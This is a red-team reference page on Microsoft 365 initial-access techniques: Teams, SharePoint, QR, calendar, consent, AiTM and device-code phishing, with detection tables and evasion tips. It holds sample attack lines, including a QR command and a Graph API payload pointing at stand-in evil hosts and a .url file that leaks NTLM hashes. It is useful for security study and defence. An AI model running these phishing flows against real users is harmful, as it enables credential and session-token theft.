# Microsoft 365 Initial Access Vectors

> **MITRE ATT&CK**: Initial Access > T1566.002 (Spearphishing Link), T1528 (Steal Application Access Token)
> **Platforms**: Microsoft 365 (Exchange Online, Teams, SharePoint, OneDrive)
> **Required Privileges**: None (social engineering) or Valid M365 credentials (for tenant-based attacks)
> **OPSEC Risk**: Medium-High (M365 audit logging captures most interactions)

## Strategic Overview

Microsoft 365 has become the dominant enterprise productivity platform, making it the primary target surface for initial access beyond traditional email phishing. While classic email-based phishing (covered in [phishing-payloads.md](phishing-payloads.md)) remains effective, adversaries increasingly exploit Teams messaging, SharePoint/OneDrive trusted-domain hosting, QR code payloads, and adversary-in-the-middle (AiTM) phishing-as-a-service platforms. These vectors exploit the implicit trust organizations place in Microsoft's own infrastructure and the gaps between email security gateways and collaboration platform controls. Red team operators must understand these vectors to simulate realistic modern threat scenarios and help organizations identify defensive blind spots across their M365 tenant.

## Technical Deep-Dive

### Microsoft Teams Phishing

Teams presents a growing attack surface because most organizations focus security controls on email while leaving Teams messaging largely unmonitored.

#### External Tenant Messaging

```
# By default, M365 tenants allow external users to send Teams messages
# This bypasses email security gateways entirely

# Attack flow:
# 1. Attacker creates M365 tenant (free developer tenant or purchased)
# 2. Attacker sends Teams message to target user from external tenant
# 3. Target sees "External" tag but message appears in Teams client
# 4. Message contains phishing link or social engineering pretext

# Key advantage: No email gateway inspection of Teams messages
# Key limitation: External messages display an "External" warning banner
# Some organizations disable external Teams messaging (TeamsExternalAccessPolicy)
```

#### Teams Worm / Propagation Scenarios

```
# Once an M365 account is compromised, Teams can be weaponized for propagation:
# 1. Send phishing messages to all contacts/channels from the compromised account
# 2. Messages appear as internal (no "External" tag) - high trust
# 3. Embed malicious links or files in Teams chat
# 4. Leverage Teams tabs to embed phishing pages within the Teams interface

# Graph API can automate mass messaging from compromised accounts:
# POST https://graph.microsoft.com/v1.0/chats/{chat-id}/messages
# Authorization: Bearer <stolen_access_token>
```

#### Tab-Based Phishing

```
# Teams tabs can embed arbitrary web content (Website tabs)
# Attacker with channel access adds a tab pointing to a credential harvester
# The tab renders inside the Teams client, appearing trusted
# Users may not inspect the URL since content appears "inside" Teams

# Attack flow:
# 1. Compromise account or get added to a Team
# 2. Add a "Website" tab to a popular channel
# 3. Tab loads attacker-controlled credential harvester
# 4. Users interact with it believing it's a legitimate internal tool
```

#### GIFShell Concept

```
# GIFShell (Bobby Rauch, 2022) demonstrated a covert C2 channel via Teams GIFs
# Concept: Abuse Microsoft's GIF rendering infrastructure for data exfiltration
# Commands embedded in GIF filenames served through Microsoft's CDN
# Responses exfiltrated via Teams message webhook inspection

# While Microsoft considered this low severity, it demonstrated that
# Teams infrastructure can be abused for covert communication channels
# Relevant for understanding detection gaps in Teams monitoring
```

### SharePoint / OneDrive Payload Delivery

SharePoint and OneDrive links originate from `*.sharepoint.com` domains, which are trusted and allowlisted by most email gateways and web proxies.

```
# Trusted-Domain Payload Hosting
# 1. Upload malicious file to attacker-controlled SharePoint/OneDrive
# 2. Generate sharing link
# 3. Send link via email or Teams
# 4. Victim clicks link -> downloads file from *.sharepoint.com
# 5. Email gateways trust *.sharepoint.com and often skip scanning

# MOTW Bypass via Cloud-Hosted Documents
# Files opened directly from SharePoint Online in desktop Office apps
# may not receive the Mark-of-the-Web depending on how they are accessed.
# "Open in Desktop App" from SharePoint can bypass Protected View
# because the file is treated as coming from a "trusted location"

# .url File Abuse from SharePoint Libraries
# Upload .url (Internet Shortcut) files to SharePoint document libraries
# When a user clicks the .url file from SharePoint, it opens the URL
# The URL can point to a WebDAV-hosted payload or credential harvester
# .url files can reference SMB paths to capture NTLMv2 hashes:
# [InternetShortcut]
# URL=file://attacker-server/share/payload
```

### QR Code Phishing (Quishing)

QR codes have become a significant phishing vector because they bypass URL scanning controls that operate on text-based links.

```
# Why QR codes bypass defenses:
# - Email gateways scan text-based URLs but NOT URLs encoded in images
# - QR codes are rendered as images (PNG/JPEG) in email bodies
# - Automated sandbox detonation cannot "scan" a QR code image
# - Users must scan with a mobile device, which typically has fewer security controls

# Attack flow:
# 1. Generate QR code pointing to credential harvester (e.g., AiTM proxy)
# 2. Embed QR code in phishing email with pretext:
#    "Scan to re-authenticate your MFA" / "Scan for updated benefits"
# 3. User scans QR code with personal mobile device
# 4. Mobile browser opens credential harvester
# 5. Credentials/tokens captured on a device outside corporate MDM/EDR

# QR code generation:
# Python: qrcode library
# CLI: qrencode -o phish.png "https://evil-aitm-proxy.com/login"

# Defensive gap: Even if the organization has strong email filtering,
# QR-to-mobile phishing shifts the attack to an unmanaged device
```

### Browser-in-the-Browser (BitB)

Browser-in-the-Browser (mrd0x, 2022) creates fake browser popup windows that mimic OAuth/SSO login prompts, making phishing pages nearly indistinguishable from legitimate authentication flows.

```
# Concept: Render a fake browser window (HTML/CSS/JS) inside the
# attacker's phishing page that mimics a legitimate OAuth popup
# The fake window shows a spoofed URL bar with the real identity provider URL

# Attack flow:
# 1. User clicks "Sign in with Microsoft" on phishing page
# 2. Fake popup appears showing https://login.microsoftonline.com
# 3. URL bar is actually an image/HTML element - not a real address bar
# 4. User enters credentials into the fake popup -> sent to attacker

# What makes it convincing:
# - Fake window matches the exact look of Chrome/Edge/Firefox popups
# - URL bar shows the legitimate domain (it's just rendered HTML)
# - Window is draggable and resizable like a real popup
# - SSL padlock icon is displayed

# Detection via window behavior analysis:
# - Real popups appear in the OS taskbar; BitB popups do not
# - Real popups can be dragged outside the parent browser window
# - Right-clicking the URL bar behaves differently
# - JavaScript: window.opener checks differ for real vs fake popups

# Reference: https://mrd0x.com/browser-in-the-browser-phishing/
# Templates: https://github.com/mrd0x/BITB
```

### AiTM Phishing Frameworks (Beyond Evilginx)

While Evilginx2 is covered in [phishing-payloads.md](phishing-payloads.md), the AiTM phishing landscape has expanded significantly with phishing-as-a-service (PhaaS) platforms.

```
# Adversary-in-the-Middle (AiTM) frameworks act as transparent reverse proxies
# between the victim and the real authentication service, capturing credentials
# and session tokens in real-time to bypass MFA.
```

#### Framework Comparison

| Framework | Type | MFA Bypass | Key Feature | Deployment |
|-----------|------|------------|-------------|------------|
| **Evilginx2** | Open-source | Yes (session token) | Phishlet-based config, mature ecosystem | Self-hosted |
| **EvilProxy** | PhaaS (commercial) | Yes (session token) | Turnkey service, pre-built templates for M365/Google | SaaS (criminal) |
| **Modlishka** | Open-source | Yes (session token) | Automated TLS cert, real-time credential capture | Self-hosted |
| **Muraena** | Open-source | Yes (session token) | Go-based, paired with NecroBrowser for session automation | Self-hosted |

```
# EvilProxy (Phishing-as-a-Service)
# - Sold as a subscription service on criminal forums
# - Provides pre-configured reverse proxy setups for major platforms
# - Targets: Microsoft 365, Google Workspace, GitHub, Apple, Facebook
# - Operators require no technical skill - dashboard-driven setup
# - Includes analytics, session management, and API access
# - Red team relevance: Understanding the threat model for defensive planning

# Modlishka
# - Open-source AiTM proxy (Go-based)
# - Automatic TLS certificate generation
# - Real-time credential and token harvesting
# - Can be chained with automation tools for post-capture actions
# GitHub: https://github.com/drk1wi/Modlishka

# Muraena + NecroBrowser
# - Muraena: Go-based reverse proxy (similar to Modlishka/Evilginx)
# - NecroBrowser: Headless browser that replays captured sessions
# - Combined: Automated phishing -> capture -> session replay pipeline
# GitHub: https://github.com/muraenateam/muraena
```

### Calendar Invite Attacks

Calendar-based attacks exploit the automatic processing of meeting invitations and the trust users place in calendar events.

```
# Meeting Invite Social Engineering
# - Send calendar invites with meeting links pointing to credential harvesters
# - Invites auto-populate in the target's calendar (Outlook default behavior)
# - Users click "Join Meeting" expecting a legitimate conference call
# - Link opens AiTM proxy or credential harvester

# Calendar Injection via Graph API
# When an M365 account is compromised, the Graph API enables programmatic
# calendar event creation in other users' calendars:
# POST https://graph.microsoft.com/v1.0/users/{target-user}/events
# Authorization: Bearer <access_token>
# Body: { "subject": "Mandatory Security Training",
#          "body": {"content": "<a href='https://evil.com'>Click here</a>"},
#          "start": {...}, "end": {...},
#          "attendees": [...] }

# ICS File Abuse
# - ICS (iCalendar) files can be sent as email attachments
# - When opened, they create calendar events with embedded links/descriptions
# - ICS files bypass some email gateway URL scanning since the URL is inside
#   the calendar event body, not in the email body itself
# - Events created from ICS files appear as legitimate calendar entries
```

### Consent Phishing (Illicit Consent Grant)

Consent phishing tricks users into granting OAuth permissions to a malicious application, giving the attacker persistent API access without needing credentials.

```
# Attack flow:
# 1. Attacker registers an Azure AD application with a benign name
#    (e.g., "Microsoft Security Update", "SharePoint Document Viewer")
# 2. Application requests permissions: Mail.Read, Files.ReadWrite, etc.
# 3. Attacker sends link to the OAuth consent URL to the target
# 4. Target clicks "Accept" on the Microsoft consent prompt
# 5. Attacker's app receives an access token and refresh token
# 6. Attacker accesses target's mail, files, etc. via Graph API

# This technique persists beyond password changes - the OAuth grant survives
# until the application consent is explicitly revoked

# Detailed coverage: See Azure-specific consent phishing tradecraft in
# ../13-cloud-security/azure/azure-initial-access.md
```

## Detection & Evasion

### What Defenders See

| Vector | Detection Opportunities |
|--------|------------------------|
| Teams phishing | Unified Audit Log: `MessageSent` events with external domains; DLP policies on Teams content |
| SharePoint delivery | SharePoint audit logs: file sharing events, anonymous link creation, external sharing |
| QR code phishing | Limited: Image analysis in email gateway (few support this); mobile device management logs |
| BitB attacks | Endpoint telemetry: browser spawning unusual popups; user reports of suspicious windows |
| AiTM proxies | Impossible travel alerts; sign-in from known AiTM infrastructure IPs; anomalous token replay |
| Calendar attacks | Exchange audit: calendar event creation by external or non-standard clients; ICS attachment scanning |
| Consent phishing | Azure AD audit logs: `Consent to application` events; risky OAuth permission grants |

### Evasion Techniques

- **Teams**: Use compromised internal accounts to avoid "External" tag; time messages during business hours
- **SharePoint**: Host payloads on legitimate SharePoint tenants to blend with normal sharing activity
- **QR codes**: Embed QR codes as inline images (not attachments) to avoid attachment scanning
- **AiTM proxies**: Use residential IP proxies and matching user-agent to avoid anomalous sign-in detection
- **Calendar**: Send invites from compromised internal accounts; use legitimate-looking meeting details

### OPSEC Considerations

- M365 Unified Audit Logs capture extensive telemetry across all services
- Microsoft Defender for Office 365 applies Safe Links and Safe Attachments across Teams and SharePoint
- Conditional Access policies may block sign-ins from unfamiliar locations or devices
- Assume all Graph API interactions are logged in the Unified Audit Log

## 2025 Techniques

### ConsentFix -- Browser-Native OAuth Token Phishing

```
# ConsentFix (Push Security, December 2025)
# MITRE: T1528 / T1550.001
# Combines OAuth consent phishing with ClickFix-style user prompts

# Attack flow:
# 1. Victim receives phishing link with a convincing pretext
# 2. Link redirects to Azure CLI login (az login) in browser
# 3. Azure CLI generates OAuth authorization code in localhost URL
# 4. Victim is prompted (ClickFix-style) to copy the localhost URL
# 5. Victim pastes URL into attacker-controlled page
# 6. Attacker exchanges authorization code for OAuth tokens

# Why this is critical:
# - Azure CLI is a FIRST-PARTY Microsoft app (cannot be blocked or deleted)
# - Implicitly trusted: bypasses Conditional Access restrictions
# - No endpoint telemetry -- attack happens entirely in the browser
# - Full account takeover without capturing passwords or triggering MFA
# - OAuth tokens persist beyond password changes

# Defensive countermeasures:
# - Monitor for Azure CLI sign-ins from unexpected users
# - Alert on OAuth token grants to Azure CLI from non-admin accounts
# - User awareness training on pasting URLs into untrusted pages
```

### FIDO2 / Passkey Authentication Downgrade Attack

```
# IOActive research (OutOfTheBox 2025, Bangkok)
# MITRE: T1557 / T1556

# Concept: FIDO2/passkeys are NOT unphishable if the authentication
# flow itself can be manipulated before the client receives it

# Attack using Cloudflare Workers ($0 cost):
# 1. Deploy transparent proxy via Cloudflare Workers
# 2. Victim visits phishing URL -> proxied to Microsoft login
# 3. Worker intercepts authentication config JSON from Microsoft
# 4. Worker modifies JSON: sets FidoKey to non-default, promotes
#    PhoneAppNotification as primary authentication method
# 5. Victim sees phone notification prompt instead of FIDO2 challenge
# 6. Victim approves push notification -> session token captured

# Alternative (Proofpoint research):
# Spoofing user agent to unsupported browser (e.g., Safari on Windows)
# causes Microsoft Entra to fall back to less secure auth methods
# No proxy required -- just a modified User-Agent header

# Impact: Undermines the "FIDO2 is unphishable" security narrative
# Red teams targeting FIDO2-protected environments now have viable bypasses
```

### AiTM Framework Evolution (2025)

The AiTM phishing landscape underwent a fundamental shift in 2025: attacks surged **146% year-over-year** with nearly **40,000 incidents detected daily** by Microsoft. **84% of compromised accounts** observed by Obsidian Security had MFA enabled.

#### Evilginx Pro

```
# Evilginx Pro (Kuba Gretzky, 2025)
# Completely rewritten proxy engine after 2+ years of development
# Key improvements:
# - Deeper structured HTML/HTTP manipulation
# - Rewriting login URL paths (evades Safe Browsing path-pattern checks)
# - Advanced phishlet creation workflow
# - Enterprise-grade stability and performance
```

#### EvilWorker -- Service Worker AiTM

```
# EvilWorker (ahaz1701, 2025)
# MITRE: T1557
# Novel AiTM paradigm using browser service workers as malicious proxies

# How it works:
# 1. Victim clicks phishing link
# 2. Service worker is registered in victim's browser
# 3. Service worker intercepts ALL subsequent requests
# 4. Requests redirected through attacker-controlled proxy
# 5. Credentials and session tokens captured transparently

# Key advantage over Evilginx:
# - No per-target phishlet configuration required
# - Fully autonomous and dynamic -- adapts to any service in real-time
# - Service worker persists in the browser even after tab is closed
# - Harder to detect than traditional reverse proxy AiTM
```

#### EvilNoVNC -- Browser-Based Remote Desktop Phishing

```
# EvilNoVNC (JoelGMSec, 2024-2025)
# MITRE: T1557
# Delivers a real browser session to the victim via noVNC (HTML5 VNC client)

# How it works:
# 1. Victim clicks phishing link
# 2. noVNC streams attacker's real browser session to victim
# 3. Victim sees and interacts with the ACTUAL login page
# 4. All input, cookies, saved passwords, session tokens captured in real-time
# 5. Victim authenticates on the attacker's browser environment

# Critical impact:
# Bypasses ALL forms of MFA including FIDO2/hardware security keys
# Because the victim is authenticating ON the attacker's real session
# No reverse proxy, no phishlets -- the real site, controlled remotely
```

#### Sneaky 2FA + Browser-in-the-Browser Integration

```
# Sneaky 2FA PhaaS Kit (November 2025)
# MITRE: T1557 / T1566.002
# Convergence of BitB visual deception with AiTM token theft

# Fake browser popup windows mimicking legitimate login forms:
# - Spoofed address bar showing real identity provider URL
# - Combined with AiTM session token capture
# Anti-analysis: obfuscation, dev tools disabled, rapid domain rotation

# Defensive note: BitB popups don't appear in OS taskbar and
# cannot be dragged outside the parent browser window
```

#### Tycoon 2FA -- Dominant PhaaS Platform

```
# Tycoon 2FA (2025 updates)
# Accounted for 89% of ALL PhaaS attacks in early 2025

# 2025 updates:
# - Rotating CAPTCHA techniques (April 2025)
# - Invisible obfuscation using whitespace-based encoding
# - AES encryption for all communications (May 2025)
# - Full browser fingerprinting (timezone, device features)
# - Anti-bot filtering using environmental data

# 11 major AiTM phishing kits tracked in active circulation (Sekoia.io)
# 90% of phishing campaigns in 2025 used PhaaS kits (Push Security)
```

### Microsoft Teams Vulnerability Chain (Check Point, 2025)

```
# Check Point Research uncovered multiple Teams vulnerabilities:
# MITRE: T1566.003

# 1. Invisible message editing in existing chats
#    - Modify previously sent messages without notification
#    - Plant phishing links in trusted conversation context

# 2. Spoofed notification emails appearing to come from Teams
#    - Emails pass SPF/DKIM/DMARC checks for legitimate Teams infra
#    - Recipients trust Teams notification formatting

# 3. Faked caller identities in Teams calls
#    - Impersonate executives in voice/video calls
#    - Combined with deepfake capability for high-value targets

# 4. CEO/executive impersonation within trusted Teams environment
#    - Leverages organizational trust in internal communications
#    - Bypasses email-focused security awareness training
```

### Email Bombing + Teams Vishing (Black Basta / 3AM Pattern)

```
# Multi-channel social engineering playbook (Sophos MDR, 2024-2025)
# MITRE: T1566.004 / T1566.003

# Attack pattern:
# 1. Flood target inbox with ~1,000 emails in 50 minutes (email bombing)
# 2. Contact target via Teams or phone impersonating IT help desk
# 3. Offer to "fix" the spam problem
# 4. Convince target to install AnyDesk or Quick Assist
# 5. Deploy malware via the remote access tool

# Documented in 15+ incidents by Sophos with 55 additional attempts detected
# Also adopted by 3AM ransomware group and Scattered Spider

# Quick Assist + Matanbuchus Loader variant (CyberProof, July 2025):
# External Teams calls -> Quick Assist activation -> Matanbuchus Loader

# Red team application:
# Email bomb creates a legitimate pretext for the help desk call
# Effective when direct phishing is heavily filtered
```

### Device Code Phishing at Scale (2025)

```
# Device code phishing transitioned from red team novelty to
# mainstream state-sponsored campaigns in 2025
# MITRE: T1528 / T1078.004

# Surge: Daily detection volumes from September 2025 onward
# Actors: Russian APTs (UNK_AcademicFlare), TA2723 (financial)

# UNK_AcademicFlare pattern:
# 1. Compromise government/military email accounts
# 2. Build rapport via email correspondence
# 3. Share OneDrive-spoofing links leading to device code phishing
# Targets: Government, academic, think tanks, transportation (US/Europe)

# Tools for red team operations:
# - SquarePhish2: Auto-redirect to Microsoft verification page,
#   QR code support mimicking MFA, polls token endpoint
#   github.com/nromsdahl/SquarePhish2
# - Graphish: Azure App Registration + AiTM phishing kit

# Stolen tokens enable silent exfiltration of:
# SharePoint documents, Teams chat history, Outlook calendars
```

### AI-Powered Social Engineering (2025-2026)

```
# AI-generated phishing is now the NORM, not the exception
# 82.6% of phishing emails contained AI-generated content (Hoxhunt)
# AI-powered phishing achieves 4x higher click rates
# 400% rise in successful phishing scams attributed to AI tools

# Real-time AI voice cloning for vishing:
# Voice phishing surged 442% in 2025
# Deepfake-enabled vishing surged 1,600% in Q1 2025 vs Q4 2024
# Models create realistic impersonations from seconds of target audio
# UNC6040 used cloned CFO voice to steal $12M from a Canadian insurer

# Multi-channel phishing:
# 1 in 3 phishing attacks delivered OUTSIDE of email (Push Security)
# Top non-email channels: LinkedIn DMs, Google Search ads
```

### Advanced Quishing Evasion Techniques

QR code phishing (quishing) evolved significantly through 2025 with novel evasion techniques designed to bypass OCR-based security scanning and traditional image analysis defenses.

```
# Advanced Quishing Evasion (Barracuda Networks, Abnormal AI, 2025-2026)
# MITRE: T1566.002
#
# HTML/ASCII-Constructed QR Codes:
# - QR codes built entirely from HTML table elements or ASCII characters
# - No image file generated -- the QR code IS the HTML itself
# - Bypasses OCR-based email security scanning that analyzes image attachments
# - Security gateways that scan for embedded PNG/JPEG QR codes miss these entirely
#
# Split and Nested QR Codes:
# - Malicious outer QR code wraps a legitimate inner QR code
# - Scanners that partially decode the QR see the benign inner payload
# - Full scan reveals the malicious outer redirect
# - Exploits inconsistencies in how security tools parse layered QR structures
#
# LLM-Generated Lure Text:
# - AI-generated phishing lure text accompanies QR codes in email body
# - Contextually convincing pretexts tailored to the target organization
# - Increases scan rates by creating urgency and legitimacy
#
# Scale: 22% of all reported QR-based attacks were quishing in 2025
#
# State-Sponsored Adoption:
# FBI warned that Kimsuky (North Korea) is now using malicious QR codes
# in spear-phishing campaigns targeting think tanks and government entities
# FBI Flash: AC-000001-MW
#
# Sources: Barracuda Networks, FBI Flash AC-000001-MW,
#          Abnormal AI (August 2025, January 2026)
```

### Google Cloud Application Integration Phishing (T1671)

Attackers abused Google Cloud Application Integration's Send Email feature to deliver phishing emails that passed all standard email authentication checks, representing a new class of trusted-infrastructure abuse.

```
# Google Cloud Application Integration Phishing (xorlab, December 2025 - January 2026)
# MITRE: T1671 (Cloud Application Integration) -- NEW technique created for this
#
# Campaign scale:
# - 9,394 phishing emails targeting ~3,200 customers over 14 days
# - Campaign active from December 2025 through January 2026
#
# Attack mechanism:
# - Attackers abused Google Cloud Application Integration's Send Email feature
# - Phishing emails sent from: noreply-application-integration@google.com
# - Because emails were genuinely sent BY Google infrastructure,
#   they passed SPF, DKIM, DMARC, and CompAuth checks
# - Traditional email security gateways trusted the Google-originated messages
#
# Multi-hop credential harvesting:
# - Trusted infrastructure (Google, Microsoft, AWS) used at each step
# - Initial email from Google -> redirect through Microsoft/AWS services
# - Each hop leverages a different trusted domain to evade URL scanning
# - Final target: Microsoft 365 credentials
#
# Impact:
# - New MITRE ATT&CK technique T1671 (Cloud Application Integration) was
#   created specifically to categorize this class of attack
# - Demonstrates that authenticated email alone is insufficient for trust
# - Highlights the risk of cloud platform features being weaponized
#
# Sources: xorlab, Hacker News, Malwarebytes
```

### Microsoft Teams Threat Disruption (October 2025)

Microsoft documented and disrupted multiple threat campaigns targeting Microsoft Teams, highlighting Teams as an increasingly exploited alternative delivery mechanism when email-based phishing is blocked.

```
# Microsoft Teams Threat Disruption (Microsoft Security Blog, October 7, 2025)
# MITRE: T1566 / T1534 (Internal Spearphishing)
#
# Documented attack vectors:
# 1. External message abuse for phishing
#    - Attackers send phishing messages from external tenants
#    - Targets receive messages in Teams with "External" tag
#    - Messages contain malicious links or social engineering pretexts
#
# 2. Malicious file sharing via Teams channels
#    - Files shared through Teams channels bypass email gateway scanning
#    - Malware delivered through trusted SharePoint-backed storage
#    - Recipients trust files shared within their Teams environment
#
# 3. Exploitation of guest access features
#    - Attackers leverage guest account provisioning to join target tenants
#    - Guest accounts gain access to channels and shared resources
#    - Lower scrutiny compared to external email communications
#
# Why Teams is targeted:
# - Organizations often have WEAKER security controls on Teams messages
#   compared to email (no equivalent of email gateway inspection)
# - Attackers leverage Teams as an alternative delivery mechanism when
#   email-based phishing is blocked by advanced email security
# - Users have lower suspicion thresholds for Teams messages vs email
# - Teams messages bypass Safe Links/Safe Attachments in some configurations
#
# Microsoft response:
# - Multiple campaigns documented and disrupted
# - Guidance issued for restricting external access and guest policies
#
# Source: Microsoft Security Blog
```

## Cross-References

- **Phishing Payloads** ([phishing-payloads.md](phishing-payloads.md)) -- Classic email phishing, HTML smuggling, Evilginx2 basics
- **Outlook Persistence** ([../04-persistence/outlook-persistence.md](../04-persistence/outlook-persistence.md)) -- Post-access persistence via Outlook rules, forms, and home pages
- **Azure Initial Access** ([../13-cloud-security/azure/azure-initial-access.md](../13-cloud-security/azure/azure-initial-access.md)) -- Azure AD/Entra ID-specific attacks including device code phishing and consent phishing deep-dive
- **Password Attacks** ([password-attacks.md](password-attacks.md)) -- Credential spraying against M365 endpoints
- **External Remote Services** ([external-remote-services.md](external-remote-services.md)) -- Using captured M365 credentials for VPN/remote access
- **ClickFix Execution** ([../03-execution/clickfix-execution.md](../03-execution/clickfix-execution.md)) -- ConsentFix uses ClickFix-style clipboard injection
- **Cloud Credential Access** ([../07-credential-access/cloud-credential-access.md](../07-credential-access/cloud-credential-access.md)) -- OAuth token theft and device code flow abuse

## References

- MITRE ATT&CK T1566.002 - Spearphishing Link: https://attack.mitre.org/techniques/T1566/002/
- MITRE ATT&CK T1528 - Steal Application Access Token: https://attack.mitre.org/techniques/T1528/
- Microsoft Teams External Access: https://learn.microsoft.com/en-us/microsoftteams/communicate-with-users-from-other-organizations
- GIFShell Research (Bobby Rauch): https://medium.com/@bobbyrsec/gifshell-covert-attack-chain-and-c2-utilizing-microsoft-teams-gifs-1618c4e64ed7
- Browser-in-the-Browser (mrd0x): https://mrd0x.com/browser-in-the-browser-phishing/
- Modlishka: https://github.com/drk1wi/Modlishka
- Muraena: https://github.com/muraenateam/muraena
- QR Code Phishing Trends: https://www.microsoft.com/en-us/security/blog/2023/10/25/microsoft-defender-for-office-365-can-now-detect-qr-code-phishing/
- Microsoft Consent Phishing: https://learn.microsoft.com/en-us/microsoft-365/security/office-365-security/detect-and-remediate-illicit-consent-grants
- ConsentFix: https://pushsecurity.com/blog/consentfix/
- FIDO2 Downgrade: https://ioactive.com/cloud-edge-phishing/
- Evilginx Pro: https://breakdev.org/evilginx-pro/
- EvilWorker: https://github.com/ahaz1701/EvilWorker
- EvilNoVNC: https://github.com/JoelGMSec/EvilnoVNC
- SquarePhish2: https://github.com/nromsdahl/SquarePhish2
- Microsoft AiTM Statistics: https://www.microsoft.com/en-us/security/blog/2025/digital-defense-report/

---

*This document is intended for authorized security testing and educational purposes only. Always obtain proper authorization before using these techniques against any target.*
